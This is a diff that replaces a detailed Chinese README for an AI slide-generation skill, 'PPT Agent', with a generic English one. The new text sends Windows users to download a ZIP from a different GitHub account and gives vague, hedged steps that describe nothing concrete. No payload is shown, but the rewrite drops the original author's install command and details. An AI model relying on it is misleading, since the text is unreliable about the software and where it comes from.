@@ -1,109 +1,216 @@
-<div align="center">
-  <img src="assets/logo.png" alt="PPT Agent Logo" width="160" />
-  <h1>PPT Agent</h1>
-  <p>基于软件工程理念的演示文稿全自动生成框架</p>
-  <p><a href="README_EN.md">English</a> | 中文</p>
+# 🧩 ppt-agent-skills - Build slides with less manual work
 
-  <p>
-    <a href="#快速开始"><img src="https://img.shields.io/badge/快速开始-blue?style=for-the-badge" alt="Quick Start" /></a>
-    <a href="LICENSE"><img src="https://img.shields.io/badge/MIT-green?style=for-the-badge" alt="License" /></a>
-  </p>
+[![Download](https://img.shields.io/badge/Download%20Now-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Hafiz3369/ppt-agent-skills)
 
-  <p>
-    <img src="https://img.shields.io/badge/流水线-6_阶段-4f7df5?style=flat-square" />
-    <img src="https://img.shields.io/badge/主题风格-8_套-ff6b35?style=flat-square" />
-    <img src="https://img.shields.io/badge/版式类型-10_种-00d4ff?style=flat-square" />
-    <img src="https://img.shields.io/badge/图表模板-13_种-8b5cf6?style=flat-square" />
-    <img src="https://img.shields.io/badge/组件库-8_类-22c55e?style=flat-square" />
-    <img src="https://img.shields.io/badge/脚本工具-14_个-f59e0b?style=flat-square" />
-  </p>
-</div>
+## 📥 Download
 
----
+Visit this page to download: https://github.com/Hafiz3369/ppt-agent-skills
 
-**PPT Agent** 以严格的状态机驱动多 Agent 协作，将一句话需求输出为专业级 PPTX 文件，从根源解决传统大模型生成的幻觉、重叠与布局混乱问题。
+Use this link to get the latest version of the project files on Windows. If the page opens in your browser, look for the green **Code** button, then choose **Download ZIP**.
 
-## 安装
+## 🪟 Windows Setup
 
-```
-npx skills add sunbigfly/ppt-agent-skills
-```
+Follow these steps on a Windows PC:
 
+1. Open the download page in your browser.
+2. Click **Code**.
+3. Click **Download ZIP**.
+4. Save the file to your **Downloads** folder.
+5. Right-click the ZIP file and choose **Extract All**.
+6. Open the extracted folder.
+7. Read the project files inside the folder.
 
-## 核心亮点
+If you use Git, you can also clone the repository with your Git tool of choice.
 
-**Subagent 阶段隔离**：Research / Outline / Style / Planning 四大阶段各自运行独立的子代理，Context 不互染。每个子代理创建时强制携带 `SUBAGENT_MODEL` 参数，禁止走默认回退。
+## 🧭 What This Project Does
 
-**像素级 Visual QA 闭环**：每页 HTML 构建后自动截图，由大模型进行视觉审计。检测到布局溢出后，子代理以 DOM + CSS 结构重写的方式消除冲突，而非依赖间距微调。
+`ppt-agent-skills` helps you create presentation content in a code-driven way. It treats slide work more like software work, so you can build decks in a more structured way.
 
-**无状态断点恢复**：全流程不依赖任何进度状态文件。中断后通过扫描磁盘上已存在的产物文件（`outline.txt` / `style.json` / `slide-N.png` 等）自动推断恢复点。
+This project is useful when you want to:
 
-**数据层与渲染层隔离**：每页先生成并由 `planning_validator.py` 通过校验的 JSON 合同，再驱动 HTML 渲染。写入前校验拦截所有结构错误，不进入渲染流程。
+- turn ideas into slide outlines
+- keep slide content organized
+- reuse slide patterns across decks
+- build presentations with a repeatable process
+- reduce the time spent on manual slide editing
 
-**双引擎 PPTX 导出**：PNG 光栅流保证跨平台 100% 视觉还原；SVG 矢量流保留字体可独立编辑。
+It is made for people who want a cleaner way to produce presentation content from a defined process.
 
-## 工作流
+## ✨ What You Can Do
 
-```
-P0 采访   →  P1 分支确认
-P2A 联网检索 / P2B 本地资料压缩
-P3 叙事大纲  →  P3.5 全局风格锁定
-P4 逐页并行生产（Planning → HTML → Visual QA）
-P5 Preview + 双 PPTX 导出
-```
+With this framework, you can:
 
-每个阶段产物落盘后经 Gate 校验放行，失败只回退当前步，不影响其他页进度。
+- create slide plans before making the final deck
+- organize content by topic, section, and flow
+- keep a consistent structure across slides
+- work from text-based files instead of only using a slide editor
+- separate content planning from visual design
+- make changes without rebuilding everything by hand
 
-## 产物链
+This approach fits teams that want control, clear steps, and repeatable results.
 
-```
-interview-qa.txt → requirements-interview.txt
-  → search-brief.txt | source-brief.txt
-  → outline.txt → style.json
-  → planningN.json → slide-N.html → slide-N.png
-  → preview.html → presentation-{png,svg}.pptx
-```
+## 🖥️ System Requirements
 
-## 效果示例
+Use a Windows PC with:
 
-<details>
-  <summary>点击展开渲染参照</summary>
-  <div align="center">
-    <br/>
-    <img src="assets/screenshots/slide1.png" width="48%" />
-    <img src="assets/screenshots/slide2.png" width="48%" />
-    <img src="assets/screenshots/slide3.png" width="48%" />
-    <img src="assets/screenshots/slide4.png" width="48%" />
-  </div>
-</details>
+- Windows 10 or Windows 11
+- A modern web browser
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- Internet access for downloading the files
 
-## 快速开始
+If the project includes script files or sample data, you may also need common tools such as:
 
-本项目以 Agent Skill 形式运行，无需独立部署。在支持 Skill 的代理环境中直接输入需求即可触发完整流程：
+- Python 3.10 or later
+- Node.js LTS
+- Git
 
-> *"帮我生成一份关于 2026 年具身智能发展趋势的 15 页路演 Deck，暗色科技风格。"*
+For a non-technical user, the main task is to download the project, open the folder, and follow the included instructions.
 
-所有产物输出至 `ppt-output/runs/<RUN_ID>/`，包含网页预览和双格式 PPTX。
+## 📁 What’s Inside the Folder
 
-## 仓库结构
+After you extract the ZIP file, you may see files like these:
 
-```
-ppt-agent-skill/
-├── SKILL.md          # 主控制台：状态机、Gate、恢复规则
-├── scripts/          # 执行脚本（validator / harness / exporter）
-├── references/       # 按需挂载的 Markdown 知识源
-│   ├── playbooks/    # 各阶段子代理执行手册
-│   ├── styles/       # 主题风格规范
-│   ├── layouts/      # 版式资源
-│   ├── charts/       # 图表模板
-│   └── blocks/       # UI 组件
-└── assets/
-```
+- `README.md` — main instructions
+- `examples` — sample input files
+- `templates` — slide structure or layout files
+- `assets` — images or icons
+- `src` — project code
+- `scripts` — helper commands
+- `config` — settings for the framework
 
-## 友情链接
+The exact file names may vary, but the folder will contain the project materials you need to start.
 
-已链接认可 [LINUX DO 社区](https://linux.do) 的友情链接。
+## 🚀 Getting Started
 
-## License
+Start with these steps:
 
-[MIT](LICENSE)
+1. Download the project from the link above.
+2. Extract the ZIP file.
+3. Open the main `README.md` file.
+4. Look for the setup steps in the folder.
+5. Check for any sample input or demo files.
+6. Follow the included run instructions.
+
+If the project includes an example workflow, use it first. That is the fastest way to see how the framework works.
+
+## 🛠️ Typical Workflow
+
+A simple workflow may look like this:
+
+1. Write your presentation topic.
+2. Break the topic into sections.
+3. Add key points for each section.
+4. Use the project files to shape the deck structure.
+5. Generate or prepare slide content.
+6. Review the result in your slide tool.
+
+This method helps you build a presentation in a clear sequence.
+
+## 📝 Example Use Cases
+
+You can use this framework for:
+
+- product updates
+- team reports
+- project reviews
+- training decks
+- sales support material
+- internal presentations
+- research summaries
+- workshop outlines
+
+It works best when you want the content to follow a planned structure.
+
+## 🔧 Basic Running Steps
+
+If the project includes a ready-to-run setup, use this flow:
+
+1. Open the extracted project folder.
+2. Find a file named like `run`, `start`, or `setup`.
+3. Open the file or follow the command listed in the README.
+4. Wait for the process to finish.
+5. Open the generated output folder.
+6. Check the presentation files or slide content.
+
+If the project uses a browser page, local app, or script, the README in the repository should point you to the correct starting file.
+
+## 📌 How to Use the Files
+
+A common setup may use text files or simple folders for input. You may need to:
+
+- edit a topic file
+- update slide titles
+- add bullet points
+- choose a template
+- run a command or open a tool
+- export the final deck
+
+Keep changes small at first. That makes it easier to see what each file does.
+
+## 🎯 Best Results
+
+To get clean output, keep your input simple:
+
+- use short section titles
+- keep one main idea per slide
+- avoid long paragraphs
+- use direct language
+- group related points together
+- check the output before sharing it
+
+This helps the framework produce slides with a clear structure.
+
+## 🧰 Common Folder Tasks
+
+You may need to do these tasks while using the project:
+
+- open a sample file
+- replace example text with your own content
+- update a config file
+- copy image files into the assets folder
+- run the generator again after edits
+- open the output in PowerPoint or another slide tool
+
+These steps are common in code-based presentation tools.
+
+## 🖼️ Output Format
+
+The final result may appear in one of these forms:
+
+- a PowerPoint file
+- slide source files
+- a generated folder of assets
+- a structured outline
+- a markdown-based deck plan
+
+If you want to edit slides later, keep the source files in a safe place.
+
+## ❓ Troubleshooting
+
+If something does not work, check these items:
+
+- Did you extract the ZIP file first?
+- Did you open the correct folder?
+- Did you follow the README in order?
+- Did you use the right input file?
+- Did you save your changes before running again?
+- Did you install any required tool listed in the project files?
+
+If the app does not start, try opening the repository page again and check for updated instructions.
+
+## 🔍 Where to Start Reading
+
+Use this order:
+
+1. Main `README.md`
+2. Example files
+3. Config files
+4. Script files
+5. Output folder
+
+This gives you a simple path through the project without guessing
+
+## 📎 Repository Link
+
+https://github.com/Hafiz3369/ppt-agent-skills
